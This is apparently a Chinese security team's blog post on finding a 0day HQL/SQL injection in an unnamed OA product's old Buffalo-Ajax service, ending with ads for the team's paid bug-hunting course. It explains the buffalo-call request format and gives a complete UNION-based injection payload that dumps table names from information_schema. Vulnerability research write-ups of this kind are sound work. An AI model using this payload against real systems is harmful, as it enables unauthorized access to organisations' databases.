#  记某OA系统Ajax旧服务的0day漏洞挖掘   
原创 chobits02  Code4th安全团队   2025-01-16 07:29  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQGQG6ibYpsQ9hibUNQ9JogaBM4ETcLDdyuTknYvxjLbGCEQFKUEwbwpummEIZzqUcA3Mhaj6yJqd9Q/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
最近  
在最近研究某OA漏洞时，遇到了一种特殊的请求方法，请求体类似如下：  
```
<buffalo-call> <method>方法名称</method> 这里填充请求参数 </buffalo-call>
```  
  
这是一种类似XML格式的请求方法，在网上都没有搜索到审计该OA漏洞代码的文章，没有提及到为什么这么去请求，以及如何构造这类请求。本文我将以代码+漏洞的形式，解释Ajax框架和漏洞成因。  
  
首先buffalo-call这种请求方法，是Buffalo-Ajax框架的一种远程调用方法。什么是Buffalo-Ajax？Buffalo是一个前后贯通的完整的java Ajax框架，不过内容比较老旧，在2007年以后就没有再进行更新过了。  
  
参考网站：  
Buffalo AJAX - Home  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZ75dtZAuBFhe9NRict5OvKVibMnG5CibE0pkhXkPKw21OjKg1khao7RpIg/640?wx_fmt=png&from=appmsg "")  
```
Buffalo通过Servlet的init过程初始化配置暴露给Buffalo远程调用的服务（支持内置的buffalo-service.properties配置及spring配置），
根据request.getPathInfo()所得到的URL规则，如“/buffalo/simpleService”，
最后客户端通过Buffalo.Reply解析返回的结果，并实现与UI的交互。
```  
  
而Buffalo-Ajax远程调用如下：  
```
buffalo.remoteCall({Service.Method}, {Params}, {CallBackFunction})
```  
  
那根据Buffalo的描述，Service具体对应什么方法，还要去  
buffalo-service.properties里面查看  
  
这里查看下OA里面的buffalo-service.properties配置，可以看到对应服务和方法所在的包名称  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZoicpEBGM5KoG8v20E06VhH0Jy2JRMDiamnOicnoel5M7e39kiafdicUIG5A/640?wx_fmt=png&from=appmsg "")  
  
而Buffalo-Ajax可以解析的标签列表如下  
```
  protected static String tagName(int tag) {
    switch (tag) {
      case 0:
        return "null";
      case 1:
        return "boolean";
      case 2:
        return "int";
      case 3:
        return "long";
      case 4:
        return "double";
      case 6:
        return "string";
      case 9:
        return "map";
      case 10:
        return "list";
      case 11:
        return "type";
      case 12:
        return "length";
      case 13:
        return "ref";
      case 15:
        return "buffalo-call";
      case 17:
        return "fault";
      case 18:
        return "method";
      case 5:
        return "date";
      case -1:
        return "end of file";
    } 
    return "unknown " + tag;
  }
```  
  
前提条件准备完毕，咱们来审计代码。在某个服务中找到了public方法如下（方法名称和参数名称已脱敏）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZ7TK14LWkbz4aUJel8nwiaHKS7nYkYznXs5gicBBwwic0vuF7KFvKOibn3g/640?wx_fmt=png&from=appmsg "")  
  
关键代码如下，其中存在  
hql.append("'" + id + "'");  
  
但是这也不是直接的SQL语句，从from xxx where xxx in这个语法可以看出是HQL语法，是Hibernate框架的数据库查询语句  
  
这里数组的id被拼接到in的后面，最后才在末尾添加')'进行闭合  
  
可以尝试闭合造成SQL注入，但是首先Buffalo Ajax的String[]数组类型远程调用怎么传参呢？参考官方文档如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZ1maFmq8sxCEF9M0Lfyq8cLSUnXds2FKKsC2XTa4PV3LKicMYL8G99AQ/640?wx_fmt=png&from=appmsg "")  
  
首先需要外嵌type，指定引入的类，之后再加入length和具体的请求参数。看起来总感觉有些臃肿  
  
要让Hibernate框架闭合，这里参考了文章  
HQL注入深入利用  
  
其中有一种让Hibernate引擎直接在转移成SQL语句还能闭合的方法，就是传入'\'，让其作为一个字符串整体进行处理变成Mysql语句  
```
<buffalo-call>
<method>xxxx</method>
<list>
<type>xxxx</type>
<length>2</length>
<string>1</string>
<string>1\'') union select table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name,table_name from information_schema.tables where table_schema= database() LIMIT 1 OFFSET 0#</string>
</list>
</buffalo-call>
```  
  
测试用'\'还是可以注入的，但是<string>标签里面不用再加+，空格是可以正常解析的，所以直接在最后一个string传参的地方加上闭合语句就行，这里可以直接union查询出数据  
  
这里用查询当前数据库名称和当前用户名称进行验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZia4PIzwpDY6iaPj4jHQTG808lAElD5QPuMdHFckIibhuZ3viaHrI2wb3ZQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZKeuwAKib5OEB1DFW4dOh04AhyohvFqHVyQxOUaElQLQvjCbVCl80YTg/640?wx_fmt=png&from=appmsg "")  
  
验证可以执行任意SQL语句  
  
  
  
**团队新年活动，Freebuf帮会成员免费加入抽奖！**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZVcJhb5P1eR7ic8e7RNkpgUmrwTO1EWgJCNsR1n6I7YvFHcImPKT4UUw/640?wx_fmt=jpeg&from=appmsg "")  
  
帮会加入地址，新春25%折扣活动  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJQ1lxmB1M1iadvsX0RicMMEMZjqPdPwxR8vyQEeKPo73DEX3RJrEcawWBBJawXUcR3wIsC3Ab7vmyUA/640?wx_fmt=png&from=appmsg "")  
  
  
**SRC漏洞挖掘出洞课程**  
，是由团队内部师傅根据实际挖洞经历整合的适合挖掘漏洞但是缺乏思路、刚接触学习漏洞挖掘不出漏洞的师傅们的漏洞挖掘教程。  
  
第一期课程价格  
199  
，这价格还要什么自行车？课程正在持续更新中~  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247485154&idx=1&sn=90f1bce91e53a5bf538bdef11fe15b2d&chksm=c2516dcbf526e4dd6d75254b70743d30902a7f0288d001148a41cc05e2d0b9fb09702d2ea03e&scene=21#wechat_redirect)  
  
  
  
END  
  
  
  
关注Cod  
e4th安全团队  
  
了解更多网络安全内容~  
  
  
